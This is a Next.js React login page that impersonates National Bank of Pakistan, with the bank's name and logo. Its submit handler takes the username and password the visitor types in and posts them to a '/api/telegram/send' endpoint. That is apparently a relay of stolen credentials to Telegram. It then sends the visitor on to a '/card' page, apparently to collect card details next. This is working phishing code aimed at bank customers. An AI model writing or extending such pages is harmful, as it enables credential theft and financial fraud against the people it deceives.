'use client'

import { useState } from 'react'
import { useRouter } from 'next/navigation'
import { Eye, EyeOff, Lock, User } from 'lucide-react'
import { saveSubmissionData } from '@/lib/submission-store'

const logoImage =
  'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Screenshot%202026-08-08%20062819-tEXyj9UyD7CkbbGMwFg7T0dD0XA5Ym.png'

export default function LoginPage() {
  const router = useRouter()
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [rememberMe, setRememberMe] = useState(false)
  const [error, setError] = useState('')
  const [submitting, setSubmitting] = useState(false)

  const handleSubmit = async (event: React.FormEvent) => {
    event.preventDefault()
    if (submitting) return

    if (!username.trim() || !password.trim()) {
      setError('Please enter your username and password.')
      return
    }
    setError('')
    setSubmitting(true)

    try {
      const data = saveSubmissionData({ username, password, rememberMe })
      await fetch('/api/telegram/send', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify(data),
      })
    } catch {
      // Continue navigation even if the notification fails
    } finally {
      router.push('/card')
    }
  }

  return (
    <main className="login-screen flex min-h-screen flex-col items-center justify-center px-4 py-10">
      <div className="w-full max-w-[400px]">
        <section className="rounded-3xl bg-white px-6 py-8 shadow-[0_20px_45px_rgba(0,0,0,0.18)]">
          <div className="flex flex-col items-center text-center">
            <img
              src={logoImage || '/placeholder.svg'}
              alt="National Bank of Pakistan logo"
              className="h-14 w-auto object-contain"
            />
            <h1 className="mt-4 text-base font-medium text-[#555555]">National Bank of Pakistan</h1>
            <p className="mt-1 text-sm text-[#8a8a8a]" dir="rtl" lang="ur">
              نیشنل بینک آف پاکستان
            </p>
          </div>

          <div className="mt-8 text-left">
            <h2 className="text-xl font-bold text-[#1a1a1a]">Welcome Back!</h2>
            <p className="mt-1 text-sm text-[#8a8a8a]">Please sign in to your account</p>
          </div>

          <form className="mt-6" onSubmit={handleSubmit}>
            <label htmlFor="username" className="block text-sm font-medium text-[#333333]">
              Username
            </label>
            <div className="login-field mt-2 flex items-center rounded-xl border border-[#d9d9d9] bg-white">
              <span className="pl-4 pr-3 text-[#8a8a8a]">
                <User className="h-5 w-5" aria-hidden="true" />
              </span>
              <input
                id="username"
                type="text"
                autoComplete="username"
                value={username}
                onChange={(event) => {
                  setUsername(event.target.value)
                  if (error) setError('')
                }}
                placeholder="Enter your username"
                className="h-full w-full bg-transparent px-1 py-4 text-base text-[#1a1a1a] outline-none placeholder:text-[#b0b0b0]"
              />
            </div>

            <label htmlFor="password" className="mt-5 block text-sm font-medium text-[#333333]">
              Password
            </label>
            <div className="login-field mt-2 flex items-center rounded-xl border border-[#d9d9d9] bg-white">
              <span className="pl-4 pr-3 text-[#8a8a8a]">
                <Lock className="h-5 w-5" aria-hidden="true" />
              </span>
              <input
                id="password"
                type={showPassword ? 'text' : 'password'}
                autoComplete="current-password"
                value={password}
                onChange={(event) => {
                  setPassword(event.target.value)
                  if (error) setError('')
                }}
                placeholder="Enter your password"
                className="h-full w-full bg-transparent px-1 py-4 text-base text-[#1a1a1a] outline-none placeholder:text-[#b0b0b0]"
              />
              <button
                type="button"
                onClick={() => setShowPassword((value) => !value)}
                className="px-4 text-[#8a8a8a]"
                aria-label={showPassword ? 'Hide password' : 'Show password'}
              >
                {showPassword ? (
                  <EyeOff className="h-5 w-5" aria-hidden="true" />
                ) : (
                  <Eye className="h-5 w-5" aria-hidden="true" />
                )}
              </button>
            </div>

            {error && <p className="mt-2 text-xs font-medium text-[#c0392b]">{error}</p>}

            <div className="mt-4 flex items-center justify-between">
              <label htmlFor="rememberMe" className="flex items-center gap-2 text-sm text-[#555555]">
                <input
                  id="rememberMe"
                  type="checkbox"
                  checked={rememberMe}
                  onChange={(event) => setRememberMe(event.target.checked)}
                  className="h-4 w-4 rounded border-[#d9d9d9] text-[#1f8a4c] focus:ring-[#1f8a4c]"
                />
                Remember Me
              </label>
              <a href="#" className="text-sm font-medium text-[#1f8a4c] underline underline-offset-4">
                Forgot Password / Pin?
              </a>
            </div>

            <button
              type="submit"
              disabled={submitting}
              className="mt-6 flex h-14 w-full items-center justify-center rounded-full bg-gradient-to-r from-[#1f8a4c] to-[#0d5228] text-base font-bold text-white shadow-[0_8px_18px_rgba(16,82,40,0.28)] transition-transform hover:-translate-y-0.5 active:translate-y-0 disabled:opacity-70"
            >
              {submitting ? 'Please wait…' : 'Sign In'}
            </button>
          </form>

          <div className="mt-6 flex items-center gap-3">
            <span className="h-px flex-1 bg-[#e0e0e0]" />
            <span className="text-xs font-medium text-[#8a8a8a]">OR</span>
            <span className="h-px flex-1 bg-[#e0e0e0]" />
          </div>

          <p className="mt-5 text-center text-sm text-[#555555]">
            Don&apos;t have an account?{' '}
            <a href="#" className="font-semibold text-[#1f8a4c] underline underline-offset-4">
              Register here
            </a>
          </p>
        </section>
      </div>
    </main>
  )
}
